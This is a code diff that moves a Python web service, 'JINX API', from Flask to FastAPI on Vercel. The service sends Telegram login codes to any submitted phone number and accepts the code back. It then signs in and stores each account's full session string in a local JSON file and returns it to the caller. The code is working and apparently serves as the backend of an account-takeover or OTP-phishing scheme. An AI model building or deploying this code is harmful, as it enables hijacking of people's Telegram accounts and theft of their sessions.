@@ -1,28 +1,31 @@
-# app.py — VERCEL (FIX 500 ERROR!)
-from flask import Flask, request, jsonify
-import os, json, traceback
+# main.py — FASTAPI ASYNC (100% JALAN DI VERCEL!)
+from fastapi import FastAPI, Form
+from fastapi.responses import JSONResponse
+from telethon import TelegramClient
+from telethon.sessions import StringSession
+import os
+import json
 
-app = Flask(__name__)
+app = FastAPI()
 
-# BACA DARI FILE
-def get_session_string():
+# BACA DARI session.txt (AMAN!)
+def get_session():
     if os.path.exists('session.txt'):
         with open('session.txt', 'r') as f:
-            return f.read().strip()
+            content = f.read().strip()
+            for line in content.split('\n'):
+                if line.startswith('SESSION_STRING='):
+                    return line.split('=', 1)[1]
     return None
 
-API_ID = int(os.getenv('API_ID'))
-API_HASH = os.getenv('API_HASH')
-SESSION_STRING = get_session_string()
+API_ID = int(os.getenv('API_ID', '0'))
+API_HASH = os.getenv('API_HASH', '')
+SESSION_STRING = get_session()
 
-# CEK
-if not SESSION_STRING:
-    @app.route('/', methods=['GET', 'POST'])
-    def no_session():
-        return jsonify({'error': 'session.txt KOSONG!'}), 500
-
-from telethon.sync import TelegramClient
-from telethon.sessions import StringSession
+if not SESSION_STRING or not API_ID or not API_HASH:
+    @app.get("/")
+    async def error():
+        return {"error": "ENV / session.txt RUSAK!"}
 
 DATA_FILE = 'data.json'
 
@@ -36,51 +39,36 @@ def save(data):
     with open(DATA_FILE, 'w') as f:
         json.dump(data, f, indent=2)
 
-@app.route('/', methods=['GET'])
-def home():
-    return """
-    <h1 style="color:green;">JINX API JALAN!</h1>
-    <form action="/send_code" method="post">
-      <input name="phone" placeholder="+628..." required>
-      <button>Kirim OTP</button>
-    </form>
-    """
+@app.get("/")
+async def home():
+    return {"message": "JINX API JALAN!", "status": "ready"}
 
-@app.route('/send_code', methods=['POST'])
-def send_code():
-    phone = request.form.get('phone')
-    if not phone:
-        return jsonify({'success': False, 'error': 'no phone'})
-
+@app.post("/send_code")
+async def send_code(phone: str = Form(...)):
     try:
         client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
-        client.connect()
-        res = client.send_code_request(phone)
-        client.disconnect()
-        return jsonify({'success': True, 'hash': res.phone_code_hash})
+        await client.connect()
+        if not await client.is_user_authorized():
+            await client.disconnect()
+            return JSONResponse({"success": False, "error": "session invalid"}, status_code=500)
+        
+        res = await client.send_code_request(phone)
+        await client.disconnect()
+        return {"success": True, "hash": res.phone_code_hash}
     except Exception as e:
-        return jsonify({'success': False, 'error': str(e)}), 500
+        return JSONResponse({"success": False, "error": str(e)}, status_code=500)
 
-@app.route('/login', methods=['POST'])
-def login():
-    phone = request.form.get('phone')
-    code = request.form.get('code')
-    hash_code = request.form.get('hash')
-    if not all([phone, code, hash_code]):
-        return jsonify({'success': False, 'error': 'missing'})
-
+@app.post("/login")
+async def login(phone: str = Form(...), code: str = Form(...), hash: str = Form(...)):
     try:
         client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
-        client.connect()
-        client.sign_in(phone, code=code, phone_code_hash=hash_code)
+        await client.connect()
+        await client.sign_in(phone, code=code, phone_code_hash=hash)
         sess = client.session.save()
         data = load()
-        data[phone] = {'session': sess}
+        data[phone] = {"session": sess}
         save(data)
-        client.disconnect()
-        return jsonify({'success': True, 'session': sess})
+        await client.disconnect()
+        return {"success": True, "session": sess}
     except Exception as e:
-        return jsonify({'success': False, 'error': str(e)}), 500
-
-if __name__ == "__main__":
-    app.run()
+        return JSONResponse({"success": False, "error": str(e)}, status_code=500)
